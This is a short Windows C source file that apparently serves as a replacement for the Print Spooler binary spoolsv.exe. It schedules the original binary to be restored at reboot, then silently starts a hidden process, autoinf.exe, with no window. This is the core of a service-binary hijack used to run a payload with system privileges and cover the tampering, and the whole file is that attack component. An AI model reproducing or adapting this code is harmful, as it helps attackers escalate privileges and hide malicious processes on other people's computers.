#include <Windows.h>
void start(){
	//Set up move back just in case
	MoveFileExA("C:\\Windows\\System32\\spoolsv.bak.exe","C:\\Windows\\System32\\spoolsv.exe",
		MOVEFILE_REPLACE_EXISTING|MOVEFILE_DELAY_UNTIL_REBOOT);

	//start replacement proc
	char windowsPath[MAX_PATH];
	GetWindowsDirectoryA(windowsPath,MAX_PATH);
	SetCurrentDirectoryA(windowsPath);
	STARTUPINFOA strt;
	PROCESS_INFORMATION proci;
	for(int i = 0; i < sizeof(strt); i++)
		((char*)&strt)[i]=0;
	for(int i = 0; i < sizeof(proci); i++)
		((char*)&proci)[i]=0;
	//one of these will work
	if(CreateProcessA("System32\\autoinf.exe",NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&strt,&proci) == 0)
		CreateProcessA("SysWOW64\\autoinf.exe",NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&strt,&proci);
}

